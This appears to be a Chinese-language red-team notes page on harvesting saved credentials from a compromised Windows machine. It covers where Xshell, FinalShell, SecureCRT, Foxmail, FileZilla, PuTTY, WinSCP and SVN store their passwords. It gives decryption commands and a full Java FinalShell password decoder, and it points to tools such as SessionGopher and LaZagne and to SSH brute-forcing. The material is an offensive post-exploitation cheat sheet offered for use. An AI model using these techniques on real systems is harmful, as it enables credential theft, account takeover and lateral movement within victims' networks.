---
title: xshell等其他凭据
date: 2025-03-28 07:46:00
updated: 2025-06-23 08:42:19
tags:
  - 内网
  - Windows信息收集
---
# Xshell、Xftp

[GitHub - dzxs/Xdecrypt: Xshell Xftp password decrypt](https://github.com/dzxs/Xdecrypt)

```powershell
whoami /user
python3 Xdecrypt.py -s "username"+"S-1-5-21-3236955782-1939288761-1217588242-1001" -p "C:\Users\win10\Documents\NetSarang\Xshell\Sessions"
```

| XShell 5 | %userprofile%\Documents\NetSarang\Xshell\Sessions |
| --- | --- |
| XFTP 5 | %userprofile%\Documents\NetSarang\Xftp\Sessions |
| XShell 6 | %userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions |
| XFTP 6 | %userprofile%\Documents\NetSarang Computer\6\Xftp\Sessions |

# FinalShell

尝试把json文件拿回来然后进去解密。

`**C:\Users\win10\AppData\Local\finalshell\conn**`

```shell
javac FinalShellDecodePass.java
java FinalShellDecodePass 密文
```
```java
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;

public class FinalShellDecodePass {
    public static void main(String[] args)throws Exception {
        System.out.println(decodePass(args[0]));
    }
    public static byte[] desDecode(byte[] data, byte[] head) throws Exception {
        SecureRandom sr = new SecureRandom();
        DESKeySpec dks = new DESKeySpec(head);
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
        SecretKey securekey = keyFactory.generateSecret(dks);
        Cipher cipher = Cipher.getInstance("DES");
        cipher.init(2, securekey, sr);
        return cipher.doFinal(data);
    }
    public static String decodePass(String data) throws Exception {
        if (data == null) {
            return null;
        } else {
            String rs = "";
            byte[] buf = Base64.getDecoder().decode(data);
            byte[] head = new byte[8];
            System.arraycopy(buf, 0, head, 0, head.length);
            byte[] d = new byte[buf.length - head.length];
            System.arraycopy(buf, head.length, d, 0, d.length);
            byte[] bt = desDecode(d, ranDomKey(head));
            rs = new String(bt);

            return rs;
        }
    }
    static byte[] ranDomKey(byte[] head) {
        long ks = 3680984568597093857L / (long)(new Random((long)head[5])).nextInt(127);
        Random random = new Random(ks);
        int t = head[0];

        for(int i = 0; i < t; ++i) {
            random.nextLong();
        }

        long n = random.nextLong();
        Random r2 = new Random(n);
        long[] ld = new long[]{(long)head[4], r2.nextLong(), (long)head[7], (long)head[3], r2.nextLong(), (long)head[1], random.nextLong(), (long)head[2]};
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        DataOutputStream dos = new DataOutputStream(bos);
        long[] var15 = ld;
        int var14 = ld.length;

        for(int var13 = 0; var13 < var14; ++var13) {
            long l = var15[var13];

            try {
                dos.writeLong(l);
            } catch (IOException var18) {
                var18.printStackTrace();
            }
        }

        try {
            dos.close();
        } catch (IOException var17) {
            var17.printStackTrace();
        }

        byte[] keyData = bos.toByteArray();
        keyData = md5(keyData);
        return keyData;
    }
    public static byte[] md5(byte[] data) {
        String ret = null;
        byte[] res=null;

        try {
            MessageDigest m;
            m = MessageDigest.getInstance("MD5");
            m.update(data, 0, data.length);
            res=m.digest();
            ret = new BigInteger(1, res).toString(16);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return res;
    }
}

```

# SecureCRT

在不同版本的SecureCRT中`**%APPDATA%\VanDyke\Config\Sessions\example.com.ini**`配置中对应的password可能是不一样的，有些密码存储在**Password**项，有些存储的是**Password V2**项，具体如下：

> S:"Password"=u17cf50e394ecc2a06fa8919e1bd67cf0f37da34c78e7eb87a3a9a787a9785e802dd0eae4e8039c3ce234d34bfe28bbdc
> 
> S:"Password V2"=02:7b9f594a1f39bb36bbaa0d9688ee38b3d233c67b338e20e2113f2ba4d328b6fc8c804e3c02324b1eaad57a5b96ac1fc5cc1ae0ee2930e6af2e5e644a28ebe3fc

这两者之间的加解密方法是有区别的。具体一般以SecureCRT 7.3.3版本进行分界。之前的版本一般会使用password加密算法，之后的一般使用password v2算法。

## 低版本(password)

拿文件回来直接用脚本看

[GitHub - gitPoc32/Forensic: Tools for forensic annalisys](https://github.com/gitPoc32/Forensic)

```powershell
python2 SecureCRT-decryptpass.py 172.16.81.134.ini
```

## 高版本(password v2)

把`%APPDATA%\VanDyke\Config\`整个目录拷贝到本机SecureCRT的Config目录下，然后直接连接。但版本要与目标的一致，否则可能出问题。

找到目标securecrt保存在本地的所有连接会话文件，默认都存放在当前用户数据目录下的Config目录下的Sessions目录中,以.ini命名

`%APPDATA%\VanDyke\Config\Sessions`  
`C:\Users\win10\AppData\Roaming\VanDyke\Config\Sessions`

# teamserver

[TV_getpass.exe](https://github.com/Enul1ttle/Tools)

# foxmail

```plain
[Foxmail 7.2 版]
C:\Program Files\Foxmail 7.2\Storage\<account_emailaddress>\Accounts\Account.rec0

[Foxmail 7.0 版]
C:\Program Files\Foxmail 7.0\Data\AccCfg\Accounts.tdat

[Foxmail 6 版.x]
C:\Program Files\Foxmail\mail\<account_emailaddress>\Account.stg
```

# FileZilla

存放路径`C:\Users\win10\AppData\Roaming\FileZilla\recentservers.xml`

base64解码即可

# PuTTY

获取连接记录`HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\`

[SSH暴力破解工具PuTTY](https://www.sec-in.com/article/463)

还可以通过fscan爆破ssh

# WinSCP

```powershell
reg query "HKEY_USERS\S-1-5-21-3448889457-1595340786-1372807316-1000\Software\Martin Prikryl\WinSCP 2\Sessions"
```

[GitHub - anoopengineer/winscppasswd: WinSCP Password Extractor/Decrypter/Revealer written in go language](https://github.com/anoopengineer/winscppasswd)

```powershell
winscppasswd.exe <host> <username> <encrypted_password>
```

  

或者还使用SessionGopher自动化提取WinSCP，PuTTY等保存的会话信息[GitHub - Arvanaghi/SessionGopher: SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally.](https://github.com/Arvanaghi/SessionGopher)

```powershell
. .\SessionGopher.ps1
Invoke-SessionGopher -Thorough
```

# svn

`C:\Users\win10\AppData\Roaming\Subversion\auth\svn.simple`

TSvnPwd.exe或者[GitHub - AlessandroZ/LaZagne: Credentials recovery project](https://github.com/AlessandroZ/LaZagne)